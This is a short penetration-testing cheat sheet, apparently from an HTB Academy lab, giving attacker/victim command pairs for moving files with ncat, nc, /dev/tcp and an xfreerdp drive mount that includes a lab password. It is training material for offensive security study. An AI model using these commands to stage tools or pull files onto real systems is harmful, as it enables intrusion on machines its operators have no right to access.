# **MISCELLANEOUS FILE TRANSFER**

## Using Ncat

> ### Victim
>
>     ncat -l -p 8000 --recv-only > <DESTINATION_FILE>

> ### Attacker
>
>     ncat --send-only 192.168.49.128 8000 < <SOURCE_FILE>

## Using nc

> ### Victim
>
>     nc -l -p 8000 > <DESTINATION_FILE>

> ### Attacker
>
>     nc -q 0 192.168.49.128 8000 < <SOURCE_FILE>


## Sending File as Input to nc

> ### Attacker
>
>     sudo nc -l -p 443 -q 0 < <SOURCE_FILE>

> ### Victim
>
>     nc 192.168.49.128 443 > <SOURCE_FILE>

## Sending File as Input to Ncat

> ### Attacker
>
>     sudo ncat -l -p 443 --send-only < <SOURCE_FILE>

> ### Victim
>
>     ncat 192.168.49.128 443 --recv-only > <SOURCE_FILE>

## Recieving using /dev/tcp

> ### Victim
>
>     cat < /dev/tcp/<IP>/443 > <DESTINATION_FILE>

## Mounting a Linux Folder using xfreerdp

> ### Connection Command
>
>     xfreerdp /v:<IP> /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer